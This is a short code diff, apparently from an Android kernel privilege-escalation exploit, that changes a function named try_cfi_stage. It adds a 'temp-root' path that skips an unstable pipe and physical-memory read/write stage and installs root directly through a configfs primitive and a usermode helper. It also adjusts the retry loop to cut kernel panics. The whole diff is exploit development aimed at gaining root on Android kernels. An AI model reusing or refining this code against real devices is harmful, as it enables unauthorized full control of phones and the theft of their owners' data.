@@ -249,11 +249,19 @@ int try_cfi_stage(void) {
   }
 
   int installed = 0;
-  pipe_stage_attempts = 0;
-  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
+  if (cve_temp_root_mode()) {
+    /* BVK1 temp-root: the pipe/physrw stage is the dominant panic source
+     * and is only needed for KernelSU late-load.  Queue the umh root
+     * directly through the CFI-stage configfs primitive. */
+    pipe_stage_attempts = 1;
+    reset_pipe_attempt();
+    installed = install_android_root(fd);
+  } else {
+  for (int attempt = 0; attempt < 4; attempt++) {
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
+      sleep(2);
     }
     if (install_child_root(fd)) {
       installed = 1;
@@ -263,6 +271,7 @@ int try_cfi_stage(void) {
         physrw_read64_ok && physrw_write64_ok) {
       break;
     }
+  }
   }
 
   if (!installed) {
